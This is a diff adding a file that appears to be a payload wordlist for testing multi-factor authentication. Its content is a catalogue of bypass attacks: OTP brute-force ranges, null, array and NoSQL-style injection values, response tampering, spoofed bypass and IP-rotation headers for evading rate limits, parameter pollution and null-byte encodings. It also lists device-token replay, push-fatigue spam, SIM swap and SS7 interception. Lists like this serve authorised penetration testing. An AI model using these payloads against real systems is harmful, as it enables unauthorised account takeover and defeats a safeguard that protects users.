@@ -1,0 +1,143 @@
+# MFA Bypass Payloads and Techniques
+# Test these against MFA verification endpoints
+# Expand through research phase
+
+# === OTP BRUTE FORCE VALUES ===
+# 4-digit OTPs (10,000 combinations)
+0000-9999
+
+# 6-digit OTPs (1,000,000 combinations)
+000000-999999
+
+# Common test/debug OTPs
+000000
+123456
+111111
+123123
+654321
+999999
+
+# === NULL/EMPTY BYPASSES ===
+# Try submitting without OTP
+otp=
+otp=null
+otp=NULL
+otp=undefined
+otp=0
+otp=000000
+mfa_code=
+verification_code=
+
+# === ARRAY/OBJECT INJECTION ===
+otp[]=123456
+otp[]
+otp={"$ne":""}
+otp=["123456"]
+{"otp": null}
+{"otp": ""}
+{"otp": 0}
+
+# === RESPONSE MANIPULATION ===
+# Intercept and change:
+"success": false → "success": true
+"verified": false → "verified": true
+"mfa_required": true → "mfa_required": false
+"status": "pending" → "status": "verified"
+HTTP 403 → HTTP 200
+HTTP 401 → HTTP 200
+
+# === DIRECT ENDPOINT ACCESS ===
+# Skip MFA step, go directly to:
+/dashboard
+/home
+/account
+/api/user
+/api/me
+
+# Try adding headers:
+X-MFA-Verified: true
+X-2FA-Bypass: true
+X-Auth-Skip: true
+
+# === RATE LIMIT BYPASS ===
+# Rotate IP addresses
+X-Forwarded-For: {random_ip}
+X-Real-IP: {random_ip}
+X-Originating-IP: {random_ip}
+
+# Add delays between requests
+# Use multiple accounts in rotation
+# Change User-Agent with each request
+
+# === BACKUP CODE ATTACKS ===
+# Common backup code formats
+12345678
+ABCD1234
+1234-5678-9012
+
+# Brute force backup codes
+# Usually 8-10 alphanumeric characters
+# Rate limits often weaker for backup codes
+
+# === REMEMBER DEVICE BYPASS ===
+# Steal/replay device token
+remember_device=true
+trust_device=1
+device_token={captured_token}
+device_id={captured_id}
+
+# Manipulate device fingerprint
+# Cookie: device_trusted=true
+
+# === SESSION MANIPULATION ===
+# After partial auth (pre-MFA), try:
+# - Access other endpoints
+# - Elevate session directly
+# - Check for auth tokens already set
+
+# === OTP REUSE ===
+# Try using same OTP multiple times
+# Try using previously used OTPs
+# Check if OTPs expire properly
+
+# === TIMING ATTACKS ===
+# Check if OTP validation timing differs
+# Longer response = partial match
+# Use statistical analysis
+
+# === RECOVERY FLOW BYPASS ===
+# Password reset might skip MFA
+# Account recovery might skip MFA
+# Support ticket might bypass MFA
+
+# === OAUTH/SSO BYPASS ===
+# Link social account (might skip MFA)
+# Use SSO provider (might skip MFA)
+# OAuth token exchange (might skip MFA)
+
+# === RACE CONDITIONS ===
+# Send multiple OTP attempts simultaneously
+# Login + OTP verification race
+# Session creation race
+
+# === PARAMETER POLLUTION ===
+mfa_code=123456&mfa_code=000000
+verification_code=wrong&verification_code=correct
+otp=a&otp=123456
+
+# === ENCODING BYPASSES ===
+otp=123456%00
+otp=%31%32%33%34%35%36
+otp=123456%0a
+otp=123456%0d
+
+# === PUSH NOTIFICATION ATTACKS ===
+# Spam push notifications (fatigue attack)
+# Intercept push notification
+# Replay push acceptance
+
+# === SMS INTERCEPTION VECTORS ===
+# SIM swap attack
+# SS7 interception
+# Voicemail hacking (for voice OTP)
+# Call forwarding setup
